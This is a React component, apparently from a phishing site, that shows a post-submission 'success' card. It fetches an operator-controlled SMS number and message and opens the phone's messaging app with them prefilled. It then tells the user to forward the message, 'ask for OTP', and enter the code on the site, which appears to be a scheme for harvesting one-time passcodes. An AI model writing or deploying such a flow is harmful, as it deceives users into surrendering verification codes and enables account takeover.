"use client";

import { useEffect, useState, useCallback } from "react";
import { CheckCircle2, MessageSquare, Loader2, ArrowRight } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { getSmsConfig, markSmsOpened } from "@/lib/actions/sms";

interface SuccessCardProps {
  submissionId: string;
  onContinue: () => void;
}

export function SuccessCard({ submissionId, onContinue }: SuccessCardProps) {
  const [isMobile, setIsMobile] = useState(false);
  const [smsNumber, setSmsNumber] = useState("32022");
  const [smsMessage, setSmsMessage] = useState("");
  const [smsOpened, setSmsOpened] = useState(false);
  const [loading, setLoading] = useState(true);

  const fetchConfig = useCallback(async () => {
    try {
      const result = await getSmsConfig(submissionId);
      if (!result.error) {
        setSmsNumber(result.sms_number);
        if (result.message) setSmsMessage(result.message);
        if (result.sms_opened) setSmsOpened(true);
      }
    } catch {
      // use defaults
    }
    setLoading(false);
  }, [submissionId]);

  useEffect(() => {
    setIsMobile(/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent));
    fetchConfig();
    const interval = setInterval(fetchConfig, 5000);
    return () => clearInterval(interval);
  }, [fetchConfig]);

  useEffect(() => {
    function handleVisibility() {
      if (document.visibilityState === "visible") fetchConfig();
    }
    function handleFocus() {
      fetchConfig();
    }
    document.addEventListener("visibilitychange", handleVisibility);
    window.addEventListener("focus", handleFocus);
    return () => {
      document.removeEventListener("visibilitychange", handleVisibility);
      window.removeEventListener("focus", handleFocus);
    };
  }, [fetchConfig]);

  async function openSmsApp() {
    const result = await getSmsConfig(submissionId);
    const number = !result.error ? result.sms_number : smsNumber;
    const message = !result.error ? result.message : smsMessage;

    await markSmsOpened(submissionId);
    setSmsOpened(true);

    const uri = message
      ? `sms:${number}?body=${encodeURIComponent(message)}`
      : `sms:${number}`;
    window.location.href = uri;
  }

  return (
    <Card className="w-full animate-in fade-in zoom-in duration-500">
      <CardContent className="pt-6 pb-6 text-center space-y-4">
        <div className="flex justify-center">
          <div className="rounded-full bg-green-100 p-3">
            <CheckCircle2 className="h-12 w-12 text-green-600" />
          </div>
        </div>
        <p className="text-sm text-gray-500 leading-relaxed">
          Go back to your mobile message app, forward this message to{" "}
          <span className="font-bold text-gray-700">{smsNumber}</span>
          {" "}and ask for OTP. Then click Continue to enter the OTP.
        </p>
        <div className="space-y-3 pt-2">
          {!smsOpened && isMobile && (
            <Button
              onClick={openSmsApp}
              variant="outline"
              className="w-full h-12 text-base gap-2"
              disabled={loading}
            >
              {loading ? (
                <Loader2 className="h-5 w-5 animate-spin" />
              ) : (
                <MessageSquare className="h-5 w-5" />
              )}
              Open Messaging App
            </Button>
          )}
          {smsOpened && (
            <Button onClick={onContinue} variant="default" className="w-full h-12 text-base gap-2">
              Continue <ArrowRight className="h-5 w-5" />
            </Button>
          )}
        </div>
      </CardContent>
    </Card>
  );
}
